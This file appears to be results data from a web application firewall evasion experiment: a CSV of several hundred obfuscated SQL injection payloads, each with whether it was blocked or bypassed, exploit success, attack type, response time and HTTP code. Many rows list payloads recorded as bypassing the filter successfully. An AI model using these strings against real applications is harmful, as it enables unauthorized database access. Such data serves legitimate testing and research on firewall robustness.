Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=.1+or+1+like+{x+(select%0b1)}=1--%0b,Blocked,No,None,piggyAtk,0.0152,73.63,No,403
0%27<@=1.%0bor+not+{a+1}=1=+(!+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0265,73.63,No,500
0%27<@!=1.+or+!%7e0=+(not+{x+(select%0b1)}=1)%0b||%27,Blocked,No,None,Unknown,0.0203,73.63,No,403
0%27<@=.1+or+!%0b{x%0b(select+1)}=1=+(not%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0134,73.63,No,200
0'<@!=1.%0b||+!%7efalse=%0b(not%0b{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,booleanAtk,0.0227,73.63,No,500
0'<@=1+or%0b{a%0b1}=1%0blike%0b{x+(select+1)}=1+or',Blocked,No,None,Unknown,0.0168,73.63,No,403
0%27<@!=.1%0b||%0btrue+like%0b{a+1}=1+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0239,73.63,No,200
0'<@!=1%0bor+!+{`if`+1}=1=+(!%0b{a+1}=1)+or',Bypassed,No,None,Unknown,0.0146,73.63,No,500
0'<@!=.1+or+0=%0b(not+true)+or%27,Blocked,No,None,booleanAtk,0.0187,73.63,No,403
0'<@=1.+or+not%0b{`if`%0b1}=1=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0274,73.63,No,500
0%27<@!=1%0b||+false=+(!~0)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0182,73.63,No,200
0%27<@!=.1+||+not+{x%0b(select%0b1)}=1=+(!%0b{`if`%0b1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0245,73.63,No,200
0'<@!=1+||+not+1=+(false)+or',Blocked,No,None,booleanAtk,0.009,73.63,No,403
0%27<@=1.+or+not~false=+(!%0b{x+(select+1)}=1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0254,73.63,No,200
0%27<@=1.%0b||+not+{a%0b1}=1=+(!%7efalse)%0bor',Bypassed,No,None,booleanAtk,0.0212,73.63,No,500
0%27<@=1+||%0b!%0b{a%0b1}=1=%0b(!+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0183,73.63,No,500
0%27<@=1.+||+not%0b{x+(select%0b1)}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0148,73.63,No,500
0%27<@=1.+||+not%0b{`if`+1}=1=%0b(!+{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0185,73.63,No,200
0%27<@!=.1+or+!+1=+(not+1)%0bor',Blocked,No,None,Unknown,0.0126,73.63,No,403
0%27||+@<@.%0bor%0b{x%0b(select%0b1)}=1+like+1+||',Bypassed,No,None,Unknown,0.012,73.63,No,500
0'<@=1.%0b||+!%0b{`if`%0b1}=1=+(!+true)%0b||%27,Bypassed,No,None,Unknown,0.006,73.63,No,500
0'<@=1%0b||+not%0b{x+(select+1)}=1=+(not%0b{a+1}=1)%0b||',Bypassed,No,None,Unknown,0.012,73.63,No,500
0%27<@=.1+||%0b!%0b{`if`%0b1}=1=+(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0132,73.63,No,200
0%27<@!=1+or+!+{a%0b1}=1=%0b(not+{a+1}=1)%0bor',Bypassed,No,None,Unknown,0.0168,73.63,No,500
0'<@=.1+or%0bnot+{x%0b(select%0b1)}=1=+(not+1)+or',Bypassed,No,None,Unknown,0.0143,73.63,No,500
0%27<@=.1%0bor+!+{a%0b1}=1=+(not+{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0156,73.63,No,200
0'<@=1.+||+not+{x+(select+1)}=1=%0b(!+{`if`+1}=1)+or%27,Blocked,No,None,Unknown,0.0053,73.63,No,403
0'<@=1+or+not+{`if`%0b1}=1=+(!%0b{`if`%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0206,73.63,No,500
0%27<@!=.1+or+not+{x%0b(select%0b1)}=1=+(!%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0192,73.63,No,200
0%27<@!=1.+or+not+{`if`%0b1}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0264,73.63,No,500
0'<@=1+or%0bnot+{x%0b(select%0b1)}=1=%0b(!+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Unknown,0.0245,73.63,No,500
0'<@=1%0b||%0bnot+{x%0b(select%0b1)}=1=+(!+{`if`+1}=1)--+,Bypassed,No,None,piggyAtk,0.016,73.63,No,500
0%27<@=1.+||%0b!%0b{a%0b1}=1=+(!%0b{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0198,73.63,No,500
0'<@=1.+or%0b!%0b{x+(select+1)}=1=%0b(false)%0bor%27,Blocked,No,None,booleanAtk,0.0158,73.63,No,403
0'<@!=1.+or+not+{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0207,73.63,No,500
0%27<@!=1.%0b||+!%0btrue=%0b(not+{a%0b1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0169,73.63,No,200
0%27<@!=1%0bor+!%0b{x%0b(select%0b1)}=1=%0b(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.0155,73.63,No,500
0%27<@=1.%0b||+!+{`if`+1}=1=+(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0158,73.63,No,200
0'<@=1+||+!%0b{x%0b(select%0b1)}=1=+(0)%0b||',Bypassed,No,None,Unknown,0.0195,73.63,No,500
0%27<@!=1.+or+not%7efalse=%0b(!%0b{x+(select+1)}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0235,73.63,No,200
0%27<@!=.1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(!%0b{x%0b(select+1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.016,73.63,No,200
0%27<@!=1%0bor+1+like%0b{x+(select%0b1)}=1+or%27,Bypassed,Yes,unionAtk,Unknown,0.0147,73.63,No,200
0%27<@!=.1%0bor%0b!%0b1=+(not+{x%0b(select+1)}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.023,73.64,No,200
0%27<@!=1+or+!+{`if`+1}=1=+(!+{x+(select%0b1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.014,73.65,No,200
0%27<@!=1.%0bor+!+{x+(select%0b1)}=1=%0b(not%0b{`if`+1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.008,73.63,No,200
0'<@!=1.%0bor%0b!+true=%0b(!+{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,booleanAtk,0.0165,73.63,No,500
0'<@=1+or+!+{x+(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0136,73.63,No,403
0%27<@!=1%0b||%0bnot%7efalse=+(not+1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0192,73.63,No,200
0'<@=1+||+!%0btrue=+(not%0b{a%0b1}=1)--%0b,Bypassed,No,None,piggyAtk,0.0181,73.63,No,500
0%27<@!=1+or%0bnot~false=%0b(not%7efalse)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0212,73.63,No,200
0'<@!=1+||+!~false=+(!+{x+(select+1)}=1)%0bor',Blocked,No,None,booleanAtk,0.0152,73.63,No,403
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0146,73.63,No,500
0%27<@!=1%0b||%0b!%0b{a+1}=1=+(!+1)+or',Bypassed,No,None,Unknown,0.0174,73.63,No,500
0%27<@!=1%0bor+{x+(select+1)}=1%0blike%0b{x+(select%0b1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0251,73.63,No,200
0%27<@!=1.+||+not%0b1=+(!+{x+(select%0b1)}=1)%0bor',Blocked,No,None,Unknown,0.0215,73.63,No,403
0'<@!=.1%0bor+!~false=%0b(false)--%0b,Bypassed,No,None,piggyAtk,0.0154,73.63,No,500
0'<@!=.1%0b||+not+{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)+or%27,Bypassed,No,None,Unknown,0.0193,73.63,No,500
0%27<@!=.1+||%0b{x%0b(select+1)}=1%0blike%0b{x%0b(select+1)}=1%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.0136,73.63,No,200
0'<@!=.1+||%0bnot%0b{x+(select%0b1)}=1=+(not+{x+(select%0b1)}=1)%0bor',Blocked,No,None,Unknown,0.0203,73.63,No,403
0%27<@=1+||%0b!+{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0218,73.63,No,200
0'<@=1.%0bor%0bnot+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0287,73.65,No,500
0%27<@=1.%0b||+!%0b{a+1}=1=+(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.024,73.65,No,500
0'<@!=1%0bor+not%0b{`if`+1}=1=%0b(!%0btrue)%0bor%27,Bypassed,No,None,booleanAtk,0.0203,73.85,No,500
0'<@=.1+or+{x%0b(select%0b1)}=1+like%0b{a+1}=1+or%27,Blocked,No,None,Unknown,0.0043,73.96,No,403
0'<@!=1+||+not+1=+(!%0b{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0177,73.96,No,500
0%27<@=.1+or+false=%0b(not%0b{`if`+1}=1)+||',Bypassed,No,None,booleanAtk,0.0264,73.96,No,500
0%27<@!=1%0bor+not+{a%0b1}=1=+(not%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0187,73.96,No,200
0%27<@=1.+||+!%0b{`if`%0b1}=1=+(not%0b{`if`+1}=1)--+,Bypassed,Yes,unionAtk,piggyAtk,0.0325,73.96,No,200
0'<@=1.%0bor+!+{x%0b(select+1)}=1=%0b(!+{`if`+1}=1)%0b||%27,Bypassed,No,None,Unknown,0.0214,73.96,No,500
0'<@!=1%0b||+not+true=%0b(not+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0215,73.96,No,500
0'<@!=1.+or+!%0b{x%0b(select%0b1)}=1=+(not%0b{a%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0217,73.96,No,500
0'<@!=1+||%0b!+{x+(select+1)}=1=+(!~false)%0bor%27,Blocked,No,None,booleanAtk,0.0139,73.96,No,403
0'<@=1.%0bor%0bnot+true=%0b(not%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,booleanAtk,0.0103,73.96,No,500
0'<@!=1.%0b||+not+{x+(select%0b1)}=1=%0b(not%0b{x%0b(select+1)}=1)+or',Bypassed,No,None,Unknown,0.015,73.96,No,500
0%27<@!=1.%0b||+not+{x+(select%0b1)}=1=%0b(0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0121,73.96,No,200
0'<@!=1.+||+!%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.015,73.96,No,500
0'<@!=1%0bor+not+{`if`+1}=1=+(!+{a+1}=1)+or%27,Bypassed,No,None,Unknown,0.025,73.96,No,500
0%27<@!=1.+||%0b!+{x%0b(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0264,73.96,No,200
0'<@=1+||+!+1=+(!+1)+||%27,Blocked,No,None,Unknown,0.0129,73.96,No,403
0'<@=1%0bor%0bnot~false=%0b(not%0b{x%0b(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.0146,73.96,No,500
0'<@!=1+or%0bnot+{a%0b1}=1=+(not+{x+(select+1)}=1)--%0b,Blocked,No,None,piggyAtk,0.01,73.96,No,403
0%27<@!=.1+or+0=%0b(not%0b{x%0b(select+1)}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0145,73.96,No,200
0%27<@!=1.+||+!%0b{a+1}=1=+(not~0)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0135,73.96,No,200
0'<@=.1%0bor+not%0b{x+(select+1)}=1=+(false)+||%27,Bypassed,No,None,booleanAtk,0.0133,73.96,No,500
0%27<@!=1.%0bor+!+true=+(!~false)%0bor',Bypassed,No,None,booleanAtk,0.0125,73.96,No,500
0'<@=.1+or+!%7e0=%0b(not%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0234,73.96,No,500
0'<@=.1%0bor%0b!+true=%0b(not+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0117,73.96,No,500
0'<@=.1+||+not+{x%0b(select%0b1)}=1=+(not+{x+(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0247,73.96,No,500
0%27<@=.1+or+not%0b{x%0b(select%0b1)}=1=%0b(!+{x%0b(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0282,73.96,No,200
0'<@!=1+or+not~0=%0b(not+{a+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0241,73.96,No,500
0%27<@=1.+or%0bnot+{x+(select+1)}=1=%0b(not+{x%0b(select%0b1)}=1)+||%27,Blocked,No,None,Unknown,0.0119,73.96,No,403
0'<@!=1%0bor+not%0b{x%0b(select+1)}=1=+(not+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,Unknown,0.0182,73.96,No,500
0'<@!=.1%0bor+!+{x%0b(select+1)}=1=%0b(!+{`if`%0b1}=1)+||',Bypassed,No,None,Unknown,0.0094,73.96,No,500
0%27<@=1+or+!+{a%0b1}=1=+(!%0b{`if`%0b1}=1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0146,73.96,No,200
0%27<@!=.1%0bor%0b!+{x%0b(select+1)}=1=+(not+{x+(select+1)}=1)+||',Bypassed,No,None,Unknown,0.0295,73.63,No,500
0%27<@!=1.%0b||+not%0b{`if`+1}=1=%0b(!%0b{x%0b(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.019,73.63,No,500
0'<@!=.1%0b||+not%0b{`if`%0b1}=1=+(!+{`if`+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0174,73.63,No,500
0'<@=1+||%0b{x+(select+1)}=1+like%0btrue+||%27,Bypassed,No,None,Unknown,0.0176,73.63,No,500
0%27<@!=1%0bor+%7e%0b{x+(select%0b1)}=1=%0b({a+1}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0282,73.63,No,200
0%27<@=1.+||+not%0b1=+(!+true)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0297,73.63,No,200
0%27<@!=1.%0b||%0bnot~false=%0b(not+1)%0bor',Bypassed,No,None,booleanAtk,0.0145,73.63,No,500
0%27<@!=1%0b||%0b!+{x+(select%0b1)}=1=+(not%0b{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0172,73.63,No,200
0%27<@=1%0bor%0bnot%0b{`if`%0b1}=1=+(!+1)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0252,73.63,No,200
0%27<@!=1+or%0bnot+{x+(select+1)}=1=+(not+true)+or',Blocked,No,None,booleanAtk,0.0131,73.63,No,403
0'<@=.1+or%0bnot+{x%0b(select+1)}=1=%0b(!+{x+(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0225,73.63,No,500
0%27<@=.1+||%0b!+{a+1}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0196,73.63,No,200
0%27<@=1.+||+!+{`if`+1}=1=+(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Unknown,0.0218,73.63,No,500
0'<@=.1%0bor%0b!%0b{x+(select%0b1)}=1=+(not%7efalse)+||%27,Bypassed,No,None,booleanAtk,0.0137,73.63,No,500
0'<@!=1+||+!%0b{a%0b1}=1=%0b(not%0b{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0221,73.64,No,500
0'<@!=1+or+!+{x+(select+1)}=1=+(!+1)%0b||%27,Blocked,No,None,Unknown,0.0214,73.65,No,403
0'<@=1.+or%0bnot+{x%0b(select+1)}=1=+(!+{x+(select%0b1)}=1)%0bor%27,Bypassed,No,None,Unknown,0.0218,73.65,No,500
0%27<@=1.+||%0b!%0b{x%0b(select+1)}=1=+(!~0)+||',Bypassed,No,None,Unknown,0.0418,73.96,No,500
0%27<@!=.1+or+!%0b{x%0b(select+1)}=1=+(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0176,73.96,No,200
0'<@!=.1+||%0bnot~0=+(!+{x%0b(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0209,73.96,No,500
0%27<@!=1%0b||%0b!+{x+(select%0b1)}=1=%0b(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Unknown,0.0274,73.96,No,500
0'<@=1.%0bor+{x+(select+1)}=1+like+{x+(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0209,73.96,No,500
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0298,73.96,No,200
0%27<@!=.1+||+!%0b{x+(select+1)}=1=+(!%0btrue)+||%27,Bypassed,Yes,unionAtk,Unknown,0.018,73.96,No,200
0'<@!=1%0b||%0b!+{x+(select+1)}=1=%0b(!%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0117,73.96,No,500
0'<@=1%0bor%0b!+{x+(select+1)}=1=%0b(!+{x+(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0238,73.96,No,500
0%27<@!=.1+or+not+1=+(!%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0213,73.96,No,500
0%27<@!=1.%0b||+not~false=+(!+{`if`+1}=1)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0178,73.96,No,200
0'<@=1.%0bor%0b!%0b{`if`%0b1}=1=%0b(not+1)%0bor%27,Bypassed,No,None,Unknown,0.0135,73.96,No,500
0'<@=1.+or+not%0b{x+(select%0b1)}=1=+(false)--%0b,Bypassed,No,None,piggyAtk,0.0153,73.96,No,500
0'<@!=.1+||%0b!%0b{a+1}=1=%0b(not%0btrue)+or',Bypassed,No,None,booleanAtk,0.0189,73.96,No,500
0'<@!=1+or+not%0b{x+(select%0b1)}=1=+(!+{x+(select+1)}=1)--+,Bypassed,No,None,piggyAtk,0.0196,73.96,No,500
0'<@=1.+or+!%0b{`if`+1}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.018,73.96,No,500
3%0b||+{x+(select%0b1)}=1+like%0b{`if`+1}=1%0b,Blocked,No,None,Unknown,0.0126,73.96,No,403
0%27<@!=.1+or+!+{x%0b(select+1)}=1=+(not~0)%23,Bypassed,Yes,unionAtk,piggyAtk,0.024,73.96,No,200
0'<@!=1.%0b||%0bnot+{x+(select+1)}=1=+(not%0btrue)+or%27,Bypassed,No,None,booleanAtk,0.0186,73.96,No,500
0'||%0b1<@.+or%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0134,73.96,No,500
0%27<@!=1.%0bor+!%0b{x%0b(select+1)}=1=+(not~0)+||',Bypassed,No,None,Unknown,0.0216,73.96,No,500
0'<@!=1.+or%0b!+{x+(select+1)}=1=+(0)+||%27,Blocked,No,None,Unknown,0.0083,73.96,No,403
0'<@=.1+||+0=+(not~0)+or%27,Blocked,No,None,Unknown,0.0114,73.96,No,403
0%27<@!=1%0b||%0bnot+{`if`%0b1}=1=+(not%7efalse)%0bor%27,Bypassed,Yes,unionAtk,booleanAtk,0.0106,73.96,No,200
0'<@=1%0bor%0bnot%0b1=%0b(not+{a+1}=1)+||',Bypassed,No,None,Unknown,0.0192,73.96,No,500
0%27<@!=1%0b||+not%0b{`if`+1}=1=%0b(not%0btrue)%0b||',Bypassed,No,None,Unknown,0.0177,73.96,No,500
0%27<@=1%0bor+not%0b{x+(select+1)}=1=+(not~false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0198,73.96,No,200
0'<@!=.1%0bor+not%0btrue=%0b(not+{x+(select+1)}=1)%0b||%27,Bypassed,No,None,booleanAtk,0.0134,73.96,No,500
0'<@!=.1%0b||+not+{x%0b(select+1)}=1=+(!+{x+(select+1)}=1)%0bor',Bypassed,No,None,Unknown,0.0173,73.96,No,500
0'<@!=1.+or%0bnot%0b{x%0b(select%0b1)}=1=+(!+{`if`+1}=1)+or%27,Blocked,No,None,Unknown,0.0135,73.96,No,403
0'<@=1.+||+!+{x+(select+1)}=1=+(!+{a%0b1}=1)+||%27,Blocked,No,None,Unknown,0.0098,73.96,No,403
0%27<@=.1%0b||%0bnot%7e0=+(not+{a%0b1}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0098,73.96,No,200
0%27<@!=1.%0bor+not~false=+(not+{a+1}=1)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0124,73.96,No,200
0'<@=.1+||%0b!+{a+1}=1=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,Unknown,0.0336,73.63,No,500
0'<@!=1.+||%0bnot+{a+1}=1=%0b(!%0b{x%0b(select+1)}=1)+||%27,Bypassed,No,None,Unknown,0.0178,73.63,No,500
0'||+!@<@+or+1%0blike+{a%0b1}=1%0bor%27,Bypassed,No,None,Unknown,0.0179,73.63,No,500
0'<@=1%0bor%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0188,73.63,No,500
0'<@!=1.+or+not+{x+(select%0b1)}=1=%0b(not%0b{`if`%0b1}=1)+||',Blocked,No,None,Unknown,0.0148,73.63,No,403
0%27<@!=.1%0bor+!+{x+(select+1)}=1=+(not%0btrue)+||',Bypassed,No,None,booleanAtk,0.0136,73.63,No,500
0'<@=.1+||%0b!+{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0219,73.63,No,500
0%27<@=1+||%0bnot+1=+(not+{`if`%0b1}=1)+||%27,Bypassed,Yes,unionAtk,Unknown,0.0185,73.63,No,200
0'<@!=1.+or+not%0b1=%0b(!+{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0283,73.63,No,500
0'<@=1+or+!%7e0=+(not%0b{x%0b(select+1)}=1)%23,Bypassed,No,None,piggyAtk,0.0205,73.63,No,500
0%27<@!=.1+||+!+{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)--%0b,Blocked,No,None,piggyAtk,0.0136,73.63,No,403
0'<@!=.1+||+!+1=%0b(not%0b{`if`%0b1}=1)+or',Bypassed,No,None,Unknown,0.0146,73.63,No,500
0'<@!=1%0bor%0b!+{a+1}=1=+(!%0b{`if`+1}=1)+or',Bypassed,No,None,Unknown,0.0172,73.65,No,500
0'||+@<@%0b||%0b!%0b{x+(select%0b1)}=1=%0b(not+1)+or',Blocked,No,None,Unknown,0.0221,73.65,No,403
0%27<@!=.1+or+not%0b{x%0b(select%0b1)}=1=+(0)+or',Bypassed,No,None,Unknown,0.0248,73.81,No,500
0'<@=1.%0bor+not+{x+(select+1)}=1=+(not+true)%0bor%27,Bypassed,No,None,booleanAtk,0.008,73.96,No,500
0%27<@=1.+||%0b!+{`if`%0b1}=1=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0149,73.96,No,500
0%27<@!=1.%0b||%0bnot%0b{`if`%0b1}=1=%0b(!+{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Unknown,0.0153,73.96,No,500
0%27<@=1%0b||+!%0b{x+(select%0b1)}=1+is%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0303,73.96,No,500
0'||+!@<@%0bor+{x%0b(select%0b1)}=1+like%0b{a+1}=1+||',Bypassed,No,None,Unknown,0.011,73.96,No,500
0%27<@!=.1+||%0bnot+{a+1}=1=+(not%0b{a%0b1}=1)+or',Bypassed,No,None,Unknown,0.0104,73.96,No,500
0%27<@=.1+||%0b!+1=+(not+{x+(select+1)}=1)+||%27,Blocked,No,None,Unknown,0.0088,73.96,No,403
0'or%0b@<@.%0b||%0bnot+1=+(not+{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0074,73.96,No,500
0%27<@=1.+||+!+{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0bor%27,Blocked,No,None,Unknown,0.0246,73.96,No,403
0'<@!=.1+or%0b!+{a%0b1}=1=+(not%0b{x+(select%0b1)}=1)%23,Bypassed,No,None,piggyAtk,0.021,73.96,No,500
0'<@!=1+||+!%0b{a%0b1}=1=+(!+{`if`+1}=1)+or%27,Bypassed,No,None,Unknown,0.0105,73.96,No,500
0%27<@=.1%0bor+!%0b{`if`%0b1}=1=+(!%0b{a%0b1}=1)%0bor%27,Bypassed,Yes,unionAtk,Unknown,0.027,73.96,No,200
0'<@!=.1%0b||%0bnot+{a+1}=1=+(not+{a+1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0198,73.96,No,500
0%27||+@<@.+||+not%0b{x%0b(select%0b1)}=1=+(not%0b{`if`+1}=1)%0bor',Bypassed,No,None,Unknown,0.0138,73.96,No,500
0%27<@=.1%0b||%0b!+{x+(select%0b1)}=1=%0b(not+{x+(select+1)}=1)+or%27,Bypassed,Yes,unionAtk,Unknown,0.0185,73.96,No,200
0%27<@=1+||%0bnot~false=%0b(!+{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0308,73.96,No,500
0%27<@!=.1+or+!+{x%0b(select+1)}=1=%0b(!+{x+(select%0b1)}=1)%0b||',Bypassed,No,None,Unknown,0.0093,73.96,No,500
0'<@!=.1%0b||+!+{`if`+1}=1=%0b(!+{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,Unknown,0.0185,73.96,No,500
0%27<@=1.+||%0bnot%0b{x+(select+1)}=1=+(!+{a+1}=1)%0bor%27,Blocked,No,None,Unknown,0.0248,73.96,No,403
0%27<@!=1%0bor%0b{`if`+1}=1+like+{`if`%0b1}=1+or',Bypassed,No,None,Unknown,0.0231,73.96,No,500
0'<@=.1+or%0b!+{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1)+or',Blocked,No,None,Unknown,0.0104,73.96,No,403
0'<@=1.+or%0bnot+{x+(select%0b1)}=1=+(not+{x%0b(select%0b1)}=1)%0bor',Blocked,No,None,Unknown,0.0096,73.96,No,403
0%27<@=.1%0b||+!+{a%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0206,73.96,No,200
0'<@=1.+||+not%0b{a%0b1}=1=%0b(!%0b{`if`%0b1}=1)--+,Bypassed,No,None,piggyAtk,0.0178,73.96,No,500
0'<@!=.1%0b||%0b0=%0b(!%0b{`if`%0b1}=1)%23,Bypassed,No,None,piggyAtk,0.0142,73.96,No,500
0'<@=1%0b||+not%0b{`if`+1}=1=%0b(not+{x%0b(select+1)}=1)%0b||',Bypassed,No,None,Unknown,0.0186,73.96,No,500
0'<@!=.1+or+not%0btrue=+(!+{a+1}=1)%0bor%27,Bypassed,No,None,booleanAtk,0.0301,73.96,No,500
0'<@=.1+||+not+{x%0b(select+1)}=1=+(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Unknown,0.0097,73.96,No,500
0'<@=.1+or+!+{`if`+1}=1=+(0)%0b||%27,Bypassed,No,None,Unknown,0.0168,73.96,No,500
